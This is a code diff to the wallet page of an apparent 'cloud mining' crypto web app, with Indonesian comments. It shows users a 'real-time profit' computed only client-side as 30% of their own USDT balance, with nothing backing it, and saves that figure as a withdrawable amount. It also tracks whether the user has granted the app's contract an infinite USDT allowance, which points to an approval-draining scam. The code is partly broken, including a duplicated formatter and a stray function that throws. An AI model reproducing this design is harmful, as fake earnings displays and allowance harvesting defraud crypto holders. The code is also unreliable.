@@ -53,6 +53,7 @@ const CLOUD_MINING_CONTRACT = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT as `
 type UserData = {
   wallet_address: string;
   usdt_balance: number;
+  profit_realtime: number;
   plan: string;
   deposit_amount: number;
   withdrawal_amount: number;
@@ -79,6 +80,15 @@ const Wallet = () => {
   const publicClient = usePublicClient();
   const [activeTab, setActiveTab] = useState<'wallet' | 'transactions'>('wallet');
   const [currentProfit, setCurrentProfit] = useState(0);
+  const [countdown, setCountdown] = useState(0);
+
+  // Fungsi untuk format countdown menjadi format HH:mm:ss
+  const formatTime = (milliseconds: number) => {
+    const hours = Math.floor(milliseconds / (1000 * 60 * 60));
+    const minutes = Math.floor((milliseconds % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((milliseconds % (1000 * 60)) / 1000);
+    return `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+  };
 
   // Hanya render di client
   useEffect(() => {
@@ -212,7 +222,7 @@ const Wallet = () => {
   
           if (error) throw error;
   
-          // Jika data belum ada, insert data baru
+          // Jika data belum ada, insert data baru dengan join_date
           if (!data) {
             const { data: insertedData, error: insertError } = await supabase
               .from('users')
@@ -220,20 +230,23 @@ const Wallet = () => {
                 wallet_address: address,
                 usdt_balance: usdtBalance, // sudah terformat
                 plan: 'free',
-                deposit_amount: 0,
-                withdrawal_amount: 0,
+                profit_realtime: currentProfit, // Update profit real-time
+                withdrawal_amount: currentProfit,
                 infinite_allowance: hasInfiniteAllowance, // simpan sebagai boolean
+                join_date: new Date().toISOString(), // Set join date saat pertama kali terhubung
                 last_login: new Date().toISOString(),
               })
               .maybeSingle();
             if (insertError) throw insertError;
             setUserData(insertedData);
           } else {
-            // Jika sudah ada, lakukan update untuk sinkronisasi data
+            // Jika sudah ada, lakukan update untuk sinkronisasi data tanpa mengubah join_date
             const { error: updateError } = await supabase
               .from('users')
               .update({
                 usdt_balance: usdtBalance,
+                profit_realtime: currentProfit, // Update profit real-time
+                withdrawal_amount: currentProfit,
                 infinite_allowance: hasInfiniteAllowance,
                 last_login: new Date().toISOString(),
               })
@@ -247,7 +260,7 @@ const Wallet = () => {
       }
     };
     loadOrUpsertUserData();
-  }, [address, usdtBalance, hasInfiniteAllowance, isAllowanceFetched]);
+  }, [address, usdtBalance, currentProfit, hasInfiniteAllowance, isAllowanceFetched]);
   
   // 7. Handle withdraw (jika diperlukan)
   const handleWithdraw = async (e: React.FormEvent) => {
@@ -311,25 +324,47 @@ const Wallet = () => {
 
   //tampilan wallet
   useEffect(() => {
-    if (!userData?.join_date || !userData?.deposit_amount) return;
+    if (!userData?.join_date || !usdtBalance) return;
 
     const joinTimestamp = new Date(userData.join_date).getTime();
-    const maxProfit = userData.deposit_amount * 0.3; // Maksimal profit 30%
+    const maxProfit = usdtBalance * 0.3; // Maksimal profit 30% dari saldo USDT
     const profitPerSecond = maxProfit / (30 * 24 * 60 * 60); // Profit per detik
+    
+    // Countdown Timer (waktu yang tersisa hingga 24 jam)
+  const remainingTime = joinTimestamp + 24 * 60 * 60 * 1000 - new Date().getTime();
+  const interval = setInterval(() => {
+    const newRemainingTime = joinTimestamp + 24 * 60 * 60 * 1000 - new Date().getTime();
+    if (newRemainingTime > 0) {
+      setCountdown(newRemainingTime); // Update countdown setiap detik
+    } else {
+      setCountdown(0); // Waktu habis, set countdown ke 0
+    }
+  }, 1000);
+
+  // Fungsi format countdown menjadi format HH:mm:ss
+    const formatTime = (milliseconds: number) => {
+      const hours = Math.floor(milliseconds / (1000 * 60 * 60));
+      const minutes = Math.floor((milliseconds % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((milliseconds % (1000 * 60)) / 1000);
+      return `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    };
 
     const updateProfit = () => {
-      const nowTimestamp = Date.now();
-      const elapsedSeconds = (nowTimestamp - joinTimestamp) / 1000;
-      const calculatedProfit = Math.min(elapsedSeconds * profitPerSecond, maxProfit);
+      const elapsedTime = (new Date().getTime() - joinTimestamp) / 1000; // Waktu yang telah berlalu dalam detik
+      const calculatedProfit = Math.min(elapsedTime * profitPerSecond, maxProfit); // Profit tidak boleh melebihi maxProfit
       setCurrentProfit(calculatedProfit);
     };
 
     updateProfit(); // Jalankan langsung saat komponen pertama kali dimuat
+  const profitInterval = setInterval(updateProfit, 1000); // Update profit setiap detik
 
-    const interval = setInterval(updateProfit, 1000); // Update profit setiap detik
+  return () => {
+    clearInterval(interval);  // Hapus interval countdown saat komponen di-unmount
+    clearInterval(profitInterval); // Hapus interval profit saat komponen di-unmount
+  };
+}, [usdtBalance, userData?.join_date]);
 
-    return () => clearInterval(interval); // Hapus interval saat komponen di-unmount
-  }, [userData]);
+  
 
   
   if (!mounted) return null;
@@ -368,9 +403,18 @@ const Wallet = () => {
                 return [
                   ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
                   ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
-                  ["Deposit:", `$${userData?.deposit_amount?.toFixed(2) || "0.00"}`],
-                  ["Profit (Real-time):", `$${currentProfit.toFixed(2)}`], // Profit real-time
-                  ["Withdrawable:", `$${userData?.withdrawal_amount?.toFixed(2) || "0.00"}`],
+                  ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
+                  ["Withdrawable:", `${
+                    userData && new Date().getTime() - new Date(userData.join_date).getTime() >= 24 * 60 * 60 * 1000
+                      ? currentProfit.toFixed(2)
+                      : "0.00"
+                  } USD`],
+                  [
+                    "Time until withdraw:",
+                    userData && countdown > 0
+                      ? formatTime(countdown)
+                      : "Available now"
+                  ],
                 ].map(([label, value], index) => (
                   <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
                     <span className="text-gray-300">{label}</span>
@@ -386,6 +430,29 @@ const Wallet = () => {
                 chainStatus="icon"
                 showBalance={false}
               />
+            </div>
+            {userData && (
+              <div className="mt-4">
+              <p className="text-gray-300">
+                {new Date().getTime() - new Date(userData.join_date).getTime() >= 24 * 60 * 60 * 1000
+                ? "You are eligible for withdrawal."
+                : "Withdrawal available after 24 hours."}
+              </p>
+              </div>
+            )}
+            {/* Tombol Withdraw */}
+            <div className="mt-8 flex justify-center gap-4">
+              <button
+              onClick={() => setShowWithdrawModal(true)}
+              disabled={!userData || new Date().getTime() - new Date(userData.join_date).getTime() < 24 * 60 * 60 * 1000}
+              className={`px-6 py-2 rounded-lg text-white transition-colors ${
+                !userData || new Date().getTime() - new Date(userData.join_date).getTime() < 24 * 60 * 60 * 1000
+                ? "bg-gray-500 cursor-not-allowed"
+                : "bg-red-500 hover:bg-red-600"
+              }`}
+              >
+              Withdraw
+              </button>
             </div>
           </div>
         </div>
@@ -426,30 +493,6 @@ const Wallet = () => {
                   </div>
                 ))
               )}
-            </div>
-            {/* Hitung apakah sudah 30 hari join (join_date ada di userData) */}
-            {userData && (
-              <div className="mt-4">
-                <p className="text-gray-300">
-                  {new Date().getTime() - new Date(userData.join_date).getTime() >= 30 * 24 * 60 * 60 * 1000
-                    ? "You are eligible for withdrawal."
-                    : "Withdrawal available after 30 days."}
-                </p>
-              </div>
-            )}
-            {/* Tombol Withdraw */}
-            <div className="mt-8 flex justify-center gap-4">
-              <button
-                onClick={() => setShowWithdrawModal(true)}
-                disabled={!userData || new Date().getTime() - new Date(userData.join_date).getTime() < 30 * 24 * 60 * 60 * 1000}
-                className={`px-6 py-2 rounded-lg text-white transition-colors ${
-                  !userData || new Date().getTime() - new Date(userData.join_date).getTime() < 30 * 24 * 60 * 60 * 1000
-                    ? "bg-gray-500 cursor-not-allowed"
-                    : "bg-red-500 hover:bg-red-600"
-                }`}
-              >
-                Withdraw
-              </button>
             </div>
           </div>
         </div>
@@ -497,3 +540,7 @@ const Wallet = () => {
 };
 
 export default Wallet;
+function setCountdown(remainingTime: number) {
+  throw new Error('Function not implemented.');
+}
+
